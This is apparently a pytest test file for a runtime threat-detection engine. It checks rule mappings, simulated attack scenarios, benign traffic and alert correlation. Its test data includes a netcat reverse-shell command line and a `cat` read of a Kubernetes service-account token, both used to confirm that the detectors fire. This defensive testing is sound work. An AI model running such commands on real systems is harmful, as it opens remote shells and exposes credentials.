import random
from datetime import timedelta

import pytest

from app.connectors import simulated as sim
from app.engine.detection import DETECTION_RULES, evaluate_event
from app.models import Alert, Asset, utcnow
from app.services.runtime import ingest_event

POD = {"id": "pod-1", "name": "checkout-web-5a11x", "type": "pod", "internet_exposed": True,
       "properties": {"namespace": "shop", "image": "acr/checkout:1.0", "runtime": "node"}}
VM = {"id": "vm-1", "name": "vm-1", "type": "vm", "internet_exposed": True, "properties": {}}


def rule_ids(event):
    return {r.id for r, _ in evaluate_event(event)}


def test_catalog_has_mitre_mapping():
    assert len(DETECTION_RULES) >= 8
    for r in DETECTION_RULES:
        assert r.mitre_technique_id.startswith("T") and r.mitre_tactic and r.mitre_technique_name


@pytest.mark.parametrize("scenario,asset,expected", [
    (sim.scenario_reverse_shell, POD, {"CDR-001", "CDR-003", "CDR-006"}),
    (sim.scenario_miner, VM, {"CDR-002"}),
    (sim.scenario_container_shell, POD, {"CDR-004", "CDR-006", "CDR-008"}),
    (sim.scenario_privesc, VM, {"CDR-005", "CDR-006"}),
    (sim.scenario_exfil, VM, {"CDR-007"}),
    (sim.scenario_c2_beacon, VM, {"CDR-003"}),
])
def test_attack_scenarios_trigger_expected_rules(scenario, asset, expected):
    events = scenario(random.Random(1), asset, utcnow())
    hits = set().union(*(rule_ids(e) for e in events))
    assert expected <= hits


def test_benign_events_do_not_alert():
    rng = random.Random(7)
    for i in range(500):
        a = POD if i % 2 else VM
        for e in sim.benign_events(rng, a, utcnow()):
            assert rule_ids(e) == set(), e


def test_specific_matchers():
    assert "CDR-001" in rule_ids({"event_type": "process_exec",
                                  "process": {"name": "nc", "cmdline": "nc 1.2.3.4 9001 -e /bin/sh"}})
    # A shell started by the container entrypoint is expected.
    assert "CDR-004" not in rule_ids({"event_type": "process_exec", "container": {"name": "c"},
                                      "process": {"name": "sh", "parent_name": "tini"}})
    # Private-network traffic on odd ports is not "unexpected outbound".
    assert rule_ids({"event_type": "network_connection",
                     "network": {"direction": "outbound", "dst_ip": "10.1.2.3", "dst_port": 9999}}) == set()
    # Legit app reading its SA token is fine; `cat` reading it is not.
    tok = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    assert rule_ids({"event_type": "file_access", "process": {"name": "java"}, "file": {"path": tok}}) == set()
    assert "CDR-006" in rule_ids({"event_type": "file_access", "process": {"name": "cat"}, "file": {"path": tok}})


def test_ingest_correlates_repeated_hits_into_one_alert(session):
    session.add(Asset(id="vm-1", name="vm-1", type="vm"))
    session.flush()
    t0 = utcnow()
    for i in range(3):
        ingest_event(session, {"asset_id": "vm-1", "event_type": "network_connection", "timestamp": t0 + timedelta(minutes=i),
                               "network": {"direction": "outbound", "dst_ip": "185.220.101.47", "dst_port": 443}})
    session.commit()
    alerts = session.query(Alert).all()
    assert len(alerts) == 1
    assert alerts[0].event_count == 3
    assert alerts[0].mitre_technique_id == "T1071"
    # Outside the correlation window -> new alert.
    ingest_event(session, {"asset_id": "vm-1", "event_type": "network_connection", "timestamp": t0 + timedelta(hours=2),
                           "network": {"direction": "outbound", "dst_ip": "185.220.101.47", "dst_port": 443}})
    session.commit()
    assert session.query(Alert).count() == 2
